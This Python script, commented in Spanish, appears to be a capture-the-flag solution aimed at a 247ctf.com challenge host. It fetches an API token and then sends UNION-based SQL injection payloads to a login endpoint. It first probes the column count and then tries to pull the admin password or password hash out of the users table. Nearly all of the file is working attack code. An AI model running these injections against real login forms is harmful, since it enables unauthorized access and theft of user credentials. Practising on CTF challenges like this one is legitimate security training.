#!/usr/bin/env python3
import requests

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    return resp.json()["message"].split("reset to ")[1].rstrip("!")

def try_sql_login(username_payload, password, api_token):
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": username_payload, "password": password, "api": api_token},
        timeout=10)
    return resp.json()

# SQL injection para extraer datos
# La query probablemente sea algo como:
# SELECT * FROM users WHERE username='$username' AND password='$password'

api_token = get_token()

# UNION-based SQL injection
# Necesito saber cuántas columnas tiene la tabla
for num_cols in range(1, 10):
    payload = "admin' UNION SELECT " + ",".join(["'x'" for _ in range(num_cols)]) + " --"
    result = try_sql_login(payload, "anything", api_token)
    print(f"{num_cols} columnas: {result}")
    if "Welcome" in result.get("message", ""):
        print(f"  ¡Posible número de columnas: {num_cols}!")
        break

# Ahora intentar extraer la contraseña
# Asumiendo que las columnas son algo como: username, password
payloads_to_extract = [
    # Intentar obtener la contraseña en el mensaje
    "admin' UNION SELECT password FROM users WHERE username='admin' --",
    "admin' UNION SELECT username,password FROM users WHERE username='admin' --",
    "' UNION SELECT password,password FROM users WHERE username='admin' --",
    
    # Tal vez la contraseña esté hasheada
    "admin' UNION SELECT password_hash FROM users WHERE username='admin' --",
]

for payload in payloads_to_extract:
    api_token = get_token()  # Get fresh token
    result = try_sql_login(payload, "anything", api_token)
    print(f"\nPayload: {payload}")
    print(f"  Result: {result}")
